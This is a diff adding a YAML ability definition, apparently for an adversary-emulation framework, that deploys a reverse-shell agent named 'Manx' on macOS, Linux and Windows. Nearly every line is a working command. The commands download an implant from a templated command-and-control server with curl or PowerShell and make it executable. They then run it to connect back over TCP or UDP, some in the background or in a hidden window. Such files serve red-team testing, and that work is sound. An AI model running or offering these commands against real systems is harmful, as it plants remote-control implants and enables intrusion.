@@ -1,0 +1,91 @@
+---
+
+- id: 356d1722-7784-40c4-822b-0cf864b0b36d
+  name: Manx
+  description: A reverse-shell agent which communicates via the TCP contact
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    darwin:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          socket="#{app.contact.tcp}";
+          contact="tcp";
+          curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+        variations:
+          - description: Run against the UDP contact
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.udp}";
+              contact="udp";
+              curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+          - description: Download with a random name and start as a background process
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.tcp}";
+              contact="tcp";
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -http $server -socket $socket -contact $contact &
+    linux:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          socket="#{app.contact.tcp}";
+          contact="tcp";
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+        variations:
+          - description: Run against the UDP contact
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.udp}";
+              contact="udp";
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -http $server -socket $socket -contact $contact &
+          - description: Download with a random name and start as a background process
+            command: |
+              server="#{app.contact.http}";
+              socket="#{app.contact.tcp}";
+              contact="tcp";
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -http $server -socket $socket -contact $contact &
+    windows:
+      psh:
+        command: |
+          if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
+          $server="#{app.contact.http}";
+          $socket="#{app.contact.tcp}";
+          $contact="tcp";
+          $url="$server/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","manx.go");
+          $data=$wc.DownloadData($url);
+          Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+          ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+        variations:
+          - description: Run against the UDP contact
+            command: |
+              if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
+              $server="#{app.contact.http}";
+              $socket="#{app.contact.udp}";
+              $contact="udp";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","manx.go");
+              $data=$wc.DownloadData($url);
+              Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+              ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
